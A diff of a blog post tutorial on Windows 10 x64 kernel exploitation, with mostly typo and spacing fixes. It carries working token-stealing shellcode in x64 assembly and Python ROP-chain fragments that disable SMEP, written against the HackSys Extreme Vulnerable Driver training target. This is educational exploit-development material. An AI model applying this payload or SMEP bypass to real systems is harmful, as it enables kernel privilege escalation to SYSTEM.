@@ -6,7 +6,7 @@ excerpt: "Revisiting token stealing payloads on Windows 10 x64 and diving into m
 ---
 Introduction
 ---
-Same ol' story with this blog post- I am continuing to expand my research/overall knowledge on Windows kernel exploitation, in addition to garnering more experience with exploit development in general. Previously I have talked about [a](https://connormcgarr.github.io/Part-2-Kernel-Exploitation/) [couple](https://connormcgarr.github.io/Part-1-Kernel-Exploitation/) of vulnerability classes on Windows 7 x86, which is an OS with minimal protections. With this post, I wanted to take a deeper dive into token stealing payloads, which I have previously talked about on x86, and see what differences the x64 architecture may have. In addition, I wanted to try to do a better job of explaining how these payloads work. This post and research also aims to get myself more familiar with the x64 architecture, which is a far more common in 2020, and understand protections such as Supervisor Mode Execution Prevention (SMEP).
+Same ol' story with this blog post - I am continuing to expand my research/overall knowledge on Windows kernel exploitation, in addition to garnering more experience with exploit development in general. Previously I have talked about [a](https://connormcgarr.github.io/Part-2-Kernel-Exploitation/) [couple](https://connormcgarr.github.io/Part-1-Kernel-Exploitation/) of vulnerability classes on Windows 7 x86, which is an OS with minimal protections. With this post, I wanted to take a deeper dive into token stealing payloads, which I have previously talked about on x86, and see what differences the x64 architecture may have. In addition, I wanted to try to do a better job of explaining how these payloads work. This post and research also aims to get myself more familiar with the x64 architecture, which is a far more common in 2020, and understand protections such as Supervisor Mode Execution Prevention (SMEP).
 
 Gimme Dem Tokens!
 ---
@@ -14,7 +14,7 @@ As apart of Windows, there is something known as the SYSTEM process. The SYSTEM 
 
 Identifying the SYSTEM Process Access Token
 ---
-We will use Windows 10 x64 to outline this overall process. First, boot up WinDbg on your debugger machine and start a kernel debugging session with your debugee machine (see my [post](https://connormcgarr.github.io/Part-1-Kernel-Exploitation/) on setting up a debugging enviornment). In addition, I noticed on Windows 10, I had to execute the following command on my debugger machine after completing the `bcdedit.exe` commands from my previous post: `bcdedit.exe /dbgsettings serial debugport:1 baudrate:115200`)
+We will use Windows 10 x64 to outline this overall process. First, boot up WinDbg on your debugger machine and start a kernel debugging session with your debugee machine (see my [post](https://connormcgarr.github.io/Part-1-Kernel-Exploitation/) on setting up a debugging environment). In addition, I noticed on Windows 10, I had to execute the following command on my debugger machine after completing the `bcdedit.exe` commands from my previous post: `bcdedit.exe /dbgsettings serial debugport:1 baudrate:115200`)
 
 Once that is setup, execute the following command, to dump the active processes:
 
@@ -56,11 +56,11 @@ So, let's use bitwise AND to try to clear out those last few bits.
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/64_6.png" alt="">
 
-As you can see, the result is 7. This is not the value we want- it is actually the inverse of it. Logic tells us, we should take the inverse of 0xf, -0xf.
+As you can see, the result is 7. This is not the value we want - it is actually the inverse of it. Logic tells us, we should take the inverse of 0xf, -0xf.
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/64_7.png" alt="">
 
-So- we have finally extracted the value of the raw access token. At this point, let's see what happens when we copy this token to a normal `cmd.exe` session.
+So - we have finally extracted the value of the raw access token. At this point, let's see what happens when we copy this token to a normal `cmd.exe` session.
 
 Openenig a new `cmd.exe` process on the debuggee machine:
 
@@ -80,9 +80,9 @@ Now, let's take a look back at our previous `cmd.exe` process.
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/64_10.png" alt="">
 
-As you can see, `cmd.exe` has become a privileged process! Now the only question remains- how do we do this dynamically with a piece of shellcode?
+As you can see, `cmd.exe` has become a privileged process! Now the only question remains - how do we do this dynamically with a piece of shellcode?
 
-Assembly? Who Needs It. I Will Never Need To Know That- It's iRrElEvAnT
+Assembly? Who Needs It. I Will Never Need To Know That - It's iRrElEvAnT
 ---
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/64_MEME1.png" alt="">
@@ -91,7 +91,7 @@ Assembly? Who Needs It. I Will Never Need To Know That- It's iRrElEvAnT
 
 Anyways, let's develop an assembly program that can dynamically perform the above tasks in x64.
 
-So let's start with this logic- instead of spawning a `cmd.exe` process and then copying the SYSTEM process access token to it- why don't we just copy the access token to the current process when exploitation occurs? The current process during exploitation should be the process that triggers the vulnerability (the process where the exploit code is ran from). From there, we could spawn `cmd.exe` from (and in context) of our current process after our exploit has finished. That `cmd.exe` process would then have administrative privilege.
+So let's start with this logic - instead of spawning a `cmd.exe` process and then copying the SYSTEM process access token to it - why don't we just copy the access token to the current process when exploitation occurs? The current process during exploitation should be the process that triggers the vulnerability (the process where the exploit code is ran from). From there, we could spawn `cmd.exe` from (and in context) of our current process after our exploit has finished. That `cmd.exe` process would then have administrative privilege.
 
 Before we can get there though, let's look into how we can obtain information about the current process.
 
@@ -127,9 +127,9 @@ Since we believe this is going to be our current process, let's view this data i
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/64_41_a.png" alt="">
 
-First, a little WinDbg kung-fu. `poi` essentially dereferences a pointer, which means obtaining the value a pointer points to.
+First, a little WinDbg-fu. `poi` essentially dereferences a pointer, which means obtaining the value a pointer points to.
 
-And as you can see, we have found where our current proccess is! The PID for the current process at this time is the SYSTEM process (PID = 4). This is subject to change dependent on what is executing, etc. But, it is very important we are able to identify the current process.
+And as you can see, we have found where our current process is! The PID for the current process at this time is the SYSTEM process (PID = 4). This is subject to change dependent on what is executing, etc. But, it is very important we are able to identify the current process.
 
 Let's start building out an assembly program that tracks what we are doing.
 
@@ -140,9 +140,9 @@ Let's start building out an assembly program that tracks what we are doing.
 [BITS 64]
 
 _start:
-	mov rax, [gs:0x188]		    ; Current thread (_KTHREAD)
-	mov rax, [rax + 0xb8]	   	    ; Current process (_EPROCESS)
-  	mov rbx, rax			    ; Copy current process (_EPROCESS) to rbx
+  mov rax, [gs:0x188]       ; Current thread (_KTHREAD)
+  mov rax, [rax + 0xb8]         ; Current process (_EPROCESS)
+    mov rbx, rax          ; Copy current process (_EPROCESS) to rbx
 ```
 
 Notice that I copied the current process, stored in RAX, into RBX as well. You will see why this is needed here shortly.
@@ -175,16 +175,16 @@ So essentially what we can do in x64 assembly, is locate the current process fro
 [BITS 64]
 
 _start:
-	mov rax, [gs:0x188]		; Current thread (_KTHREAD)
-	mov rax, [rax + 0xb8]	   	; Current process (_EPROCESS)
-  	mov rbx, rax			; Copy current process (_EPROCESS) to rbx
-	
+  mov rax, [gs:0x188]   ; Current thread (_KTHREAD)
+  mov rax, [rax + 0xb8]     ; Current process (_EPROCESS)
+    mov rbx, rax      ; Copy current process (_EPROCESS) to rbx
+  
 __loop:
-	mov rbx, [rbx + 0x2e8] 		; ActiveProcessLinks
-	sub rbx, 0x2e8		   	; Go back to current process (_EPROCESS)
-	mov rcx, [rbx + 0x2e0] 		; UniqueProcessId (PID)
-	cmp rcx, 4 			; Compare PID to SYSTEM PID 
-	jnz __loop			; Loop until SYSTEM PID is found
+  mov rbx, [rbx + 0x2e8]    ; ActiveProcessLinks
+  sub rbx, 0x2e8        ; Go back to current process (_EPROCESS)
+  mov rcx, [rbx + 0x2e0]    ; UniqueProcessId (PID)
+  cmp rcx, 4      ; Compare PID to SYSTEM PID 
+  jnz __loop      ; Loop until SYSTEM PID is found
 ```
 
 Once the SYSTEM process's `_EPROCESS` structure has been found, we can now go ahead and retrieve the token and copy it to our current process. This will unleash God mode on our current process. God, please have mercy on the soul of our poor little process.
@@ -202,27 +202,27 @@ Let's finish out the rest of our token stealing payload for Windows 10 x64.
 [BITS 64]
 
 _start:
-	mov rax, [gs:0x188]		; Current thread (_KTHREAD)
-	mov rax, [rax + 0xb8]		; Current process (_EPROCESS)
-	mov rbx, rax			; Copy current process (_EPROCESS) to rbx
+  mov rax, [gs:0x188]   ; Current thread (_KTHREAD)
+  mov rax, [rax + 0xb8]   ; Current process (_EPROCESS)
+  mov rbx, rax      ; Copy current process (_EPROCESS) to rbx
 __loop:
-	mov rbx, [rbx + 0x2e8] 		; ActiveProcessLinks
-	sub rbx, 0x2e8		   	; Go back to current process (_EPROCESS)
-	mov rcx, [rbx + 0x2e0] 		; UniqueProcessId (PID)
-	cmp rcx, 4 			; Compare PID to SYSTEM PID 
-	jnz __loop			; Loop until SYSTEM PID is found
+  mov rbx, [rbx + 0x2e8]    ; ActiveProcessLinks
+  sub rbx, 0x2e8        ; Go back to current process (_EPROCESS)
+  mov rcx, [rbx + 0x2e0]    ; UniqueProcessId (PID)
+  cmp rcx, 4      ; Compare PID to SYSTEM PID 
+  jnz __loop      ; Loop until SYSTEM PID is found
 
-	mov rcx, [rbx + 0x358]		; SYSTEM token is @ offset _EPROCESS + 0x358
-	and cl, 0xf0			; Clear out _EX_FAST_REF RefCnt
-	mov [rax + 0x358], rcx		; Copy SYSTEM token to current process
+  mov rcx, [rbx + 0x358]    ; SYSTEM token is @ offset _EPROCESS + 0x358
+  and cl, 0xf0      ; Clear out _EX_FAST_REF RefCnt
+  mov [rax + 0x358], rcx    ; Copy SYSTEM token to current process
 
-	xor rax, rax			; set NTSTATUS SUCCESS
-	ret				; Done!
+  xor rax, rax      ; set NTSTATUS SUCCESS
+  ret       ; Done!
 ```
 
 Notice our use of bitwise AND. We are clearing out the last 4 bits of the RCX register, via the CL register. If you have read my [post](https://connormcgarr.github.io/WS32_recv()-Reuse/) about a socket reuse exploit, you will know I talk about using the lower byte registers of the x86 or x64 registers (RCX, ECX, CX, CH, CL, etc). The last 4 bits we need to clear out , in an x64 architecture, are located in the low or `L` 8-bit register (`CL`, `AL`, `BL`, etc).
 
-As you can see also, we ended our shellcode by using bitwise XOR to clear out RAX. NTSTATUS uses RAX as the regsiter for the error code. NTSTATUS, when a value of 0 is returned, means the operations successfully performed.
+As you can see also, we ended our shellcode by using bitwise XOR to clear out RAX. NTSTATUS uses RAX as the register for the error code. NTSTATUS, when a value of 0 is returned, means the operations successfully performed.
 
 Before we go ahead and show off our payload, let's develop an exploit that outlines bypassing SMEP. We will use a stack overflow as an example, in the kernel, to outline using [ROP](https://connormcgarr.github.io/ROP/) to bypass SMEP.
 
@@ -241,7 +241,7 @@ SMEP policy is mandated/enabled via the CR4 register. According to [Intel](https
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/64_17.png" alt="">
 
-The CR4 register has a value of 0x00000000001506f8 in hexadecimal. Let's view that in binary, so we can see where the 20th bit resides.
+The CR4 register has a value of `0x00000000001506f8` in hexadecimal. Let's view that in binary, so we can see where the 20th bit resides.
 
 `.formats cr4`
 
@@ -261,9 +261,9 @@ Think of the implementation of SMEP as the following:
 
 Laws are created by the government. _HOWEVER_, the legislatures do not roam the streets enforcing the law. This is the job of our police force. 
 
-The same concept applies to SMEP. SMEP is enabled by the CR4 register- but the CR4 register does not enforce it. That is the job of the page table entries.
+The same concept applies to SMEP. SMEP is enabled by the CR4 register - but the CR4 register does not enforce it. That is the job of the page table entries.
 
-Why bring this up? Athough we will be outlining a SMEP bypass via ROP, let's consider another scenario. Let's say we have an arbitrary read and write primitive. Put aside the fact that PTEs are randomized for now. What if you had a read primitive to know where the PTE for the memory page of your shellcode was? Another potential (and interesting) way to bypass SMEP would be not to "disable SMEP" at all. Let's think outside the box! Instead of "going to the mountain"- why not "bring the mountain to us"? We could potentially use our read primitive to locate our user mode shellcode page, and then use our write primitive to overwrite the PTE for our shellcode and flip the `U` (usermode) flag into an `S` (supervisor mode) flag! That way, when that particular address is executed although it is a "user mode address", it is still executed because now the permissions of that page are that of a kernel mode page.
+Why bring this up? Athough we will be outlining a SMEP bypass via ROP, let's consider another scenario. Let's say we have an arbitrary read and write primitive. Put aside the fact that PTEs are randomized for now. What if you had a read primitive to know where the PTE for the memory page of your shellcode was? Another potential (and interesting) way to bypass SMEP would be not to "disable SMEP" at all. Let's think outside the box! Instead of "going to the mountain" - why not "bring the mountain to us"? We could potentially use our read primitive to locate our user mode shellcode page, and then use our write primitive to overwrite the PTE for our shellcode and flip the `U` (usermode) flag into an `S` (supervisor mode) flag! That way, when that particular address is executed although it is a "user mode address", it is still executed because now the permissions of that page are that of a kernel mode page.
 
 Although page table entries are randomized now, [this](https://www.blackhat.com/docs/us-17/wednesday/us-17-Schenk-Taking-Windows-10-Kernel-Exploitation-To-The-Next-Level%E2%80%93Leveraging-Write-What-Where-Vulnerabilities-In-Creators-Update.pdf) presentation by Morten Schenk of Offensive Security talks about derandomizing page table entries.
 
@@ -279,7 +279,7 @@ Again, I will not be covering this method of bypassing SMEP until I have done mo
 
 SMEP Says Goodbye
 ---
-Let's use the an [overflow](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) to outline bypasssing SMEP with ROP. ROP assumes we have control over the stack (as each ROP gadget returns back to the stack). Since SMEP is enabled, our ROP gagdets will need to come from kernel mode pages. Since we are assuming [medium integrity](https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625957(v=msdn.10)?redirectedfrom=MSDN) here, we can call `EnumDeviceDrivers()` to obtain the kernel base- which bypasses KASLR.
+Let's use the an [overflow](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) to outline bypasssing SMEP with ROP. ROP assumes we have control over the stack (as each ROP gadget returns back to the stack). Since SMEP is enabled, our ROP gagdets will need to come from kernel mode pages. Since we are assuming [medium integrity](https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/bb625957(v=msdn.10)?redirectedfrom=MSDN) here, we can call `EnumDeviceDrivers()` to obtain the kernel base - which bypasses KASLR.
 
 Essentially, here is how our ROP chain will work
 
@@ -303,15 +303,15 @@ Using rp++, we have found a nice ROP gadget in `ntoskrnl.exe`, that allows us to
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/64_20_a.png" alt="">
 
-As you can see, this ROP gadget is "located" at 0x140108552. However, since this is a kernel mode address- rp++ (from usermode and not ran as an administrator) will not give us the full address of this. However, if you remove the first 3 bytes, the rest of the "address" is really an offset from the kernel base. This means this ROP gadget is located at ntoskrnl.exe + 0x108552.
+As you can see, this ROP gadget is "located" at 0x140108552. However, since this is a kernel mode address - rp++ (from usermode and not ran as an administrator) will not give us the full address of this. However, if you remove the first 3 bytes, the rest of the "address" is really an offset from the kernel base. This means this ROP gadget is located at ntoskrnl.exe + 0x108552.
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/64_21_a.png" alt="">
 
-Awesome! rp++ was a bit wrong in its enumeration. rp++ says that we can put ECX into the CR4 register. Howerver, upon further inspection, we can see this ROP gadget ACTUALLY points to a `mov cr4, rcx` instruction. This is perfect for our use case! We have a way to move the contents of the RCX register into the CR4 register. You may be asking "Okay, we can control the CR4 register via the RCX register- but how does this help us?" Recall one of the properties of ROP from my previous post. Whenever we had a nice ROP gadget that allowed a desired intruction, but there was an unecessary `pop` in the gadget, we used filler data of NOPs. This is because we are just simply placing data in a register- we are not executing it.
+Awesome! rp++ was a bit wrong in its enumeration. rp++ says that we can put ECX into the CR4 register. However, upon further inspection, we can see this ROP gadget ACTUALLY points to a `mov cr4, rcx` instruction. This is perfect for our use case! We have a way to move the contents of the RCX register into the CR4 register. You may be asking "Okay, we can control the CR4 register via the RCX register - but how does this help us?" Recall one of the properties of ROP from my previous post. Whenever we had a nice ROP gadget that allowed a desired instruction, but there was an unnecessary `pop` in the gadget, we used filler data of NOPs. This is because we are just simply placing data in a register - we are not executing it.
 
-The same principle applies here. If we can `pop` our intended flag value into RCX, we should have no problem. As we saw before, our intended CR4 register value should be 0x506f8.
+The same principle applies here. If we can `pop` our intended flag value into RCX, we should have no problem. As we saw before, our intended CR4 register value should be `0x506f8`.
 
-Real quick with brevity- let's say rp++ was right in that we could only control the contents of the ECX register (instead of RCX). Would this affect us?
+Real quick with brevity - let's say rp++ was right in that we could only control the contents of the ECX register (instead of RCX). Would this affect us?
 
 Recall, however, how the registers work here.
 
@@ -327,7 +327,7 @@ Recall, however, how the registers work here.
 -----------------------------------
 ```
 
-This means, even though RCX contains 0x00000000000506f8, a `mov cr4, ecx` would take the lower 32-bits of RCX (which is ECX) and place it into the CR4 register. This would mean ECX would equal 0x000506f8- and that value would end up in CR4. So even though we would theoretically using both RCX and ECX, due to lack of `pop ecx` ROP gadgets, we will be unaffected!
+This means, even though RCX contains `0x00000000000506f8`, a `mov cr4, ecx` would take the lower 32-bits of RCX (which is ECX) and place it into the CR4 register. This would mean ECX would equal `0x000506f8` - and that value would end up in CR4. So even though we would theoretically using both RCX and ECX, due to lack of `pop ecx` ROP gadgets, we will be unaffected!
 
 Now, let's continue on to controlling the RCX register.
 
@@ -406,7 +406,7 @@ print "[+] Starting ROP chain. Goodbye SMEP..."
 input_buffer += struct.pack('<Q', kernel_address + 0x3544)      # pop rcx; ret
 
 print "[+] Flipped SMEP bit to 0 in RCX..."
-input_buffer += struct.pack('<Q', 0x506f8)           		# Intended CR4 value
+input_buffer += struct.pack('<Q', 0x506f8)              # Intended CR4 value
 
 print "[+] Placed disabled SMEP value in CR4..."
 input_buffer += struct.pack('<Q', kernel_address + 0x108552)    # mov cr4, rcx ; ret
@@ -449,7 +449,7 @@ As you can see, we have hit the `ret` we are going to overwrite.
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/64_01.png" alt="">
 
-Before we step through, let's view the call stack- to see how execution will proceed.
+Before we step through, let's view the call stack - to see how execution will proceed.
 
 `k`
 
@@ -459,9 +459,9 @@ __Open the image above in a new tab if you are having trouble viewing__.
 
 To help better understand the output of the call stack, the column `Call Site` is going to be the memory address that is executed. The `RetAddr` column is where the `Call Site` address will return to when it is done completing.
 
-As you can see, the compromised `ret` is located at `HEVD!TriggerStackOverflow+0xc8`. From there we will return to `0xfffff80302c82544`, or `AuthzBasepRemoveSecurityAttributeValueFromLists+0x70`. The next value in the `RetAddr` column, is the intended value for our CR4 register, 0x00000000000506f8. 
+As you can see, the compromised `ret` is located at `HEVD!TriggerStackOverflow+0xc8`. From there we will return to `0xfffff80302c82544`, or `AuthzBasepRemoveSecurityAttributeValueFromLists+0x70`. The next value in the `RetAddr` column, is the intended value for our CR4 register, `0x00000000000506f8`. 
 
-Recall that a `ret` instruction will load RSP into RIP. Therefore, since our intended CR4 value is located on the stack, technically our first ROP gadget would "return" to 0x00000000000506f8. However, the `pop rcx` will take that value off of the stack and place it into RCX. Meaning we do not have to worry about returning to that value, which is not a valid memory address.
+Recall that a `ret` instruction will load RSP into RIP. Therefore, since our intended CR4 value is located on the stack, technically our first ROP gadget would "return" to `0x00000000000506f8`. However, the `pop rcx` will take that value off of the stack and place it into RCX. Meaning we do not have to worry about returning to that value, which is not a valid memory address.
 
 Upon the `ret` from the `pop rcx` ROP gadget, we will jump into the next ROP gadget, `mov cr4, rcx`, which will load RCX into CR4. That ROP gadget is located at `0xfffff80302d87552`, or `KiFlushCurrentTbWorker+0x12`. To finish things out, we have the location of our user mode code, at `0x0000000000b70000`.
 
@@ -473,7 +473,7 @@ Now that we are here, stepping through should pop our intended CR4 value into RC
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/64_04.png" alt="">
 
-Perfect. Stepping through, we should land on our next ROP gadget- which will move RCX (desired value to disable SMEP) into CR4.
+Perfect. Stepping through, we should land on our next ROP gadget - which will move RCX (desired value to disable SMEP) into CR4.
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/64_05.png" alt="">
 
@@ -485,7 +485,7 @@ Nice! As you can see, after our ROP gadgets are executed - we hit our breakpoint
 
 <img src="{{ site.url }}{{ site.baseurl }}/images/64_07.png" alt="">
 
-This means we have succesfully disabled SMEP, and we can execute usermode shellcode! Let's finalize this exploit with a working POC. We will merge our payload concepts with the exploit now! Let's update our script with weaponized shellcode!
+This means we have successfully disabled SMEP, and we can execute usermode shellcode! Let's finalize this exploit with a working POC. We will merge our payload concepts with the exploit now! Let's update our script with weaponized shellcode!
 
 ```python
 import struct
@@ -568,7 +568,7 @@ print "[+] Starting ROP chain. Goodbye SMEP..."
 input_buffer += struct.pack('<Q', kernel_address + 0x3544)      # pop rcx; ret
 
 print "[+] Flipped SMEP bit to 0 in RCX..."
-input_buffer += struct.pack('<Q', 0x506f8)           		        # Intended CR4 value
+input_buffer += struct.pack('<Q', 0x506f8)                      # Intended CR4 value
 
 print "[+] Placed disabled SMEP value in CR4..."
 input_buffer += struct.pack('<Q', kernel_address + 0x108552)    # mov cr4, rcx ; ret
